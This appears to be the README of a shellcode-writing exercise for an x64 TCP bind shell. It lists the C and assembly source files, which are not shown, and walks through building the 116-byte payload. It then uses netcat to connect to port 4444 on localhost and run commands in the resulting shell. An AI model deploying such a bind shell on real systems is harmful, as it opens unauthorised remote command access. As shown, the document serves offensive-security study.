# TCP bind shell x64 shellcode

Listing:
- `bind.c` - TCP bind C code
- `bind.s` - asm rewrite of C code
- `bind_sh.s` - adapted asm for shellcode

## Usage

Use `make (target) PROJECT=bind`.

## Running

First terminal:
```
$ make skeleton PROJECT=bind
...
$ out/skeleton
Shellcode Length:  116

```

Second terminal:
```
$ sudo lsof -i -P | grep skeleton
skeleton  6713          ubuntu    3u  IPv4  86504      0t0  TCP *:4444 (LISTEN)
$ nc localhost 4444
id
uid=999(ubuntu) gid=999(ubuntu) groups=999(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),119(lpadmin),130(lxd),131(sambashare)
```
